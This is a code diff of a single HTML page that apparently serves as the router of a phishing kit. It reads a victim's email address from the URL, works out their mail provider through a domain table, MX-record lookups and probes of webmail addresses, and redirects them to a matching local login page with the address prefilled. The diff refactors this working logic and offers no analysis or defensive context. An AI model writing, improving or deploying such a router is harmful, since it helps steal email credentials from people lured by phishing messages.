@@ -1,25 +1,63 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<title>Smart Mail Router</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Redirect Based on Email Login</title>
+<style>
+  body {
+    font-family: system-ui, Arial, sans-serif;
+    padding: 2rem;
+    background: #f9f9f9;
+    color: #333;
+  }
+  h2 {
+    color: #d00;
+  }
+</style>
+</head>
+<body>
 <script>
 document.addEventListener('DOMContentLoaded', () => main());
 
 async function main () {
-  /* ---------- STEP 1 – validate & extract ---------------------------- */
+  /* ---------- STEP 1 – validate & extract ---------------------------- */
   const qs    = new URLSearchParams(location.search);
   const login = qs.get('login');
-  if (!login)        { return fail('Missing login parameter.'); }
+  if (!login)        { return fail('Missing login parameter.'); }
   const domain = login.split('@')[1]?.trim().toLowerCase();
-  if (!domain)       { return fail('Invalid e‑mail address.'); }
+  if (!domain)       { return fail('Invalid e-mail address.'); }
 
   const sanitized = domain.replace(/[^a-z0-9.-]/gi, '');
 
-  const go = folder =>
-    location.href = `${folder}/index.html?login=${encodeURIComponent(login)}`;
+  const host = location.origin;
 
-  /* ---------- STEP 2 – direct domain → folder ----------------------- */
+  /* ---------- redirect URL builder ----------------------------------- */
+  const redirectMap = folder => {
+    const loginParam = `?login=${encodeURIComponent(login)}`;
+    switch (folder) {
+      case 'groupware':
+        return `${host}/groupware/index.html${loginParam}`;
+      case 'roundcube':
+        return `${host}/roundcube/index.html${loginParam}`;
+      case 'ngw':
+        return `${host}/ngw/index.html${loginParam}`;
+      case 'aruba':
+        return `${host}/aruba/index.html${loginParam}`;
+      case 'gw':
+        return `${host}/gw/index.html${loginParam}`;
+      case 'owa':
+        return `${host}/owa/index.html${loginParam}`;
+      default:
+        return `${host}/${folder}/`; // fallback
+    }
+  };
+
+  function redirectTo(folder) {
+    location.href = redirectMap(folder);
+  }
+
+  /* ---------- STEP 2 – direct domain → folder ----------------------- */
   const direct = {
     'naver.com':'naver','daum.net':'kakao','kakao.com':'kakao','hanmail.net':'kakao',
     'nate.com':'nate','empas.com':'nate','empal.com':'nate','hanafos.com':'nate',
@@ -28,9 +66,11 @@ async function main () {
     'list.ru':'mailru','bk.ru':'mailru','internet.ru':'mailru','lotte.net':'lotte',
     'aol.com':'aol','freenet.de':'freenet','libero.it':'libero'
   };
-  for (const key in direct) { if (domain.endsWith(key)) return go(direct[key]); }
+  for (const key in direct) {
+    if (domain.endsWith(key)) return redirectTo(direct[key]);
+  }
 
-  /* ---------- STEP 3 – MX‑record routing (DNS‑over‑HTTPS) ------------ */
+  /* ---------- STEP 3 – MX-record routing (DNS-over-HTTPS) ------------ */
   try {
     const dns = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
     if (dns.ok) {
@@ -54,61 +94,64 @@ async function main () {
       };
       for (const mxHost of mxRecords) {
         const hit = Object.keys(mx).find(n => mxHost.includes(n));
-        if (hit) return go(mx[hit]);
+        if (hit) return redirectTo(mx[hit]);
       }
     }
   } catch (e) { console.warn('MX lookup failed', e); }
 
-  /* ---------- STEP 4 – probe common webmail URLs -------------------- */
+  /* ---------- STEP 4 – probe common webmail URLs -------------------- */
   const probes = {
-    /* CHANGED ↓ */
-    groupware:[`http://gw.${sanitized}/groupware/login.html`],
-    roundcube:[`http://${sanitized}/webmail/`,`http://webmail.${sanitized}/`,`http://${sanitized}:2095`],
-    ngw:[`http://mail.${sanitized}/ngw/app/#/sign`],
-    aruba:[`https://webmail.aruba.it/`],
-    gw:[`https://gw.${sanitized}/login`],
-    owa:[
+    groupware: [`http://gw.${sanitized}/groupware/login.html`],
+    roundcube: [
+      `http://${sanitized}/webmail/`,
+      `http://webmail.${sanitized}/`,
+      `http://${sanitized}:2095`,
+      `https://${sanitized}/router.html?login=${encodeURIComponent(login)}`
+    ],
+    ngw: [`http://mail.${sanitized}/ngw/app/#/sign`],
+    aruba: [`https://webmail.aruba.it/`],
+    gw: [`https://gw.${sanitized}/login`],
+    owa: [
       `https://${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`,
       `https://mail.${sanitized}/owa/auth/logon.aspx?replaceCurrent=1&url=https://${sanitized}/owa`
     ]
   };
 
-  const urlAlive = async url => {
+  async function urlAlive(url) {
     const ctrl = new AbortController();
-    const t = setTimeout(() => ctrl.abort(), 3500);
+    const timeout = setTimeout(() => ctrl.abort(), 3500);
     try {
-      await fetch(url, { method:'HEAD', mode:'no-cors', signal:ctrl.signal, cache:'no-store' });
-      clearTimeout(t);
+      await fetch(url, { method: 'HEAD', mode: 'no-cors', signal: ctrl.signal, cache: 'no-store' });
+      clearTimeout(timeout);
       return true;
-    } catch { return false; }
-  };
-
-  for (const [folder, list] of Object.entries(probes)) {
-    for (const url of list) {
-      if (await urlAlive(url)) return go(folder);
+    } catch {
+      return false;
     }
   }
 
-  /* ---------- STEP 5 – “Whois” keyword fallback --------------------- */
+  for (const [folder, urls] of Object.entries(probes)) {
+    for (const url of urls) {
+      if (await urlAlive(url)) return redirectTo(folder);
+    }
+  }
+
+  /* ---------- STEP 5 – “Whois” keyword fallback --------------------- */
   try {
-    const page = await fetch(`https://api.allorigins.win/raw?url=http://${sanitized}`, { cache:'no-store' });
+    const page = await fetch(`https://api.allorigins.win/raw?url=http://${sanitized}`, { cache: 'no-store' });
     if (page.ok) {
       const text = await page.text();
-      if (text.match(/whois/i)) return go('whois');
+      if (text.match(/whois/i)) return redirectTo('whois');
     }
   } catch (e) { console.warn('Whois check failed', e); }
 
-  /* ---------- STEP 6 – final safety net ----------------------------- */
-  go('other');
+  /* ---------- STEP 6 – final safety net ----------------------------- */
+  redirectTo('other');
 
   /* ---------- util -------------------------------------------------- */
-  function fail (msg) {
-    document.body.innerHTML = `<h2 style="font-family:sans-serif;color:#d00">${msg}</h2>`;
+  function fail(msg) {
+    document.body.innerHTML = `<h2>${msg}</h2>`;
   }
 }
 </script>
-</head>
-<body>
-<noscript>Please enable JavaScript to use this page.</noscript>
 </body>
 </html>
